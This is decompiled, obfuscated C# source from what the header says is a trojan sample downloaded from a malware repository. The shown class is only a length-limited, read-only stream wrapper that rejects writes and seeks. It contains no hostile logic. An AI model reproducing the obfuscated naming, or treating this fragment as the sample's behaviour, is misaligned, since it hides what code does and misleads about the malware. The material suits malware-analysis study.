// Decompiled with JetBrains decompiler
// Type: 8528i86u715785004.0o247o51u472584ii
// Assembly: e52a71747iaa0aa11, Version=2.1.0.0, Culture=neutral, PublicKeyToken=cac503e1823ce71c
// MVID: 0D894068-CF68-44D1-88F9-023D8A694267
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.06\HEUR-Trojan.MSIL.Crypt.gen-32d8b52e3461f3cf3cd3f6811df29ca82987bb597ad104f4ff2e7064dbd625ad.exe

using \u0038528i86u715785004;
using iu7ooo9o0383114au;
using Microsoft;
using System;
using System.IO;
using System.IO.Pipelines;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;

namespace \u0038528i86u715785004
{
  internal class \u0030o247o51u472584ii : Stream, IDisposableObservable, IDisposable
  {
    private readonly Stream ia77388432926o7i0;
    private long \u00386i3i99e98io4u0o2;

    public bool a1u83aa56624u5ai9 { get; private set; }

    public virtual bool \u003088aaaiu24e7e0e5e => !this.a1u83aa56624u5ai9;

    public virtual bool u514185079300ie61 => false;

    public virtual bool u6531oo9e5i1392a4 => false;

    public virtual long \u00391u0e3687u3183527 => throw this.u73a15906a143u5oo((Exception) new NotSupportedException());

    public virtual long \u0038u795047689iu435i
    {
      get => throw this.u73a15906a143u5oo((Exception) new NotSupportedException());
      set => throw this.u73a15906a143u5oo((Exception) new NotSupportedException());
    }

    public virtual void \u003027uaee8eao2629au() => this.u73a15906a143u5oo((Exception) new NotSupportedException());

    public virtual Task u241au30753016648(CancellationToken ii4ea697764a3ua65) => throw this.u73a15906a143u5oo((Exception) new NotSupportedException());

    public virtual Task<int> \u0030aaa1uua251u2o0i6(
      byte[] _param1,
      int u2u0951358777e2a9,
      int _param3,
      CancellationToken o9o0i1o0o098e5ai7)
    {
      // ISSUE: variable of a compiler-generated type
      \u0030o247o51u472584ii.\u003625o8736uu636481u stateMachine;
      // ISSUE: reference to a compiler-generated field
      stateMachine.\u0033i3478i4o06311e67 = this;
      // ISSUE: reference to a compiler-generated field
      stateMachine.\u003414722939o5oi621e = _param1;
      // ISSUE: reference to a compiler-generated field
      stateMachine.\u00370261i60a1687oeu1 = u2u0951358777e2a9;
      // ISSUE: reference to a compiler-generated field
      stateMachine.\u0031i246u5e984667a5a = _param3;
      // ISSUE: reference to a compiler-generated field
      stateMachine.ui041e64iu37u8900 = AsyncTaskMethodBuilder<int>.Create();
      // ISSUE: reference to a compiler-generated field
      stateMachine.\u00396euo8o6ee644oei5 = -1;
      // ISSUE: reference to a compiler-generated field
      stateMachine.ui041e64iu37u8900.Start<\u0030o247o51u472584ii.\u003625o8736uu636481u>(ref stateMachine);
      // ISSUE: reference to a compiler-generated field
      return stateMachine.ui041e64iu37u8900.Task;
    }

    public virtual int o17a030e45255ou65(
      byte[] ii137u306i4ai011u,
      int a40559u55a427o9o2,
      int ao461u0808u5ao2o9)
    {
      ao461u0808u5ao2o9 = (int) Math.Min((long) ao461u0808u5ao2o9, this.\u00386i3i99e98io4u0o2);
      int num = this.ia77388432926o7i0.Read(ii137u306i4ai011u, a40559u55a427o9o2, ao461u0808u5ao2o9);
      this.\u00386i3i99e98io4u0o2 -= (long) num;
      return num;
    }

    public virtual long \u0039647u4ue49a1ei4i5(long _param1, SeekOrigin uo3ueu0356928uo4o) => throw this.u73a15906a143u5oo((Exception) new NotSupportedException());

    public virtual void ea524708386ue19o2(long _param1) => throw this.u73a15906a143u5oo((Exception) new NotSupportedException());

    public virtual Task \u0035a950922e950e8984(
      byte[] _param1,
      int _param2,
      int _param3,
      CancellationToken _param4)
    {
      Verify.NotDisposed((IDisposableObservable) this, (string) null);
      throw new NotSupportedException();
    }

    public virtual void ue16e7e06044eeo69(byte[] _param1, int _param2, int _param3)
    {
      Verify.NotDisposed((IDisposableObservable) this, (string) null);
      throw new NotSupportedException();
    }

    protected override void Dispose(bool disposing)
    {
      this.a1u83aa56624u5ai9 = true;
      base.Dispose(disposing);
    }

    private Exception u73a15906a143u5oo(Exception _param1)
    {
      Verify.NotDisposed((IDisposableObservable) this, (string) null);
      throw _param1;
    }

    public static Stream e82iu12e6i815a7e5(this IDuplexPipe o0e16879ioeao82e5) => (Stream) new eo49eaa2566805524(o0e16879ioeao82e5);
  }
}
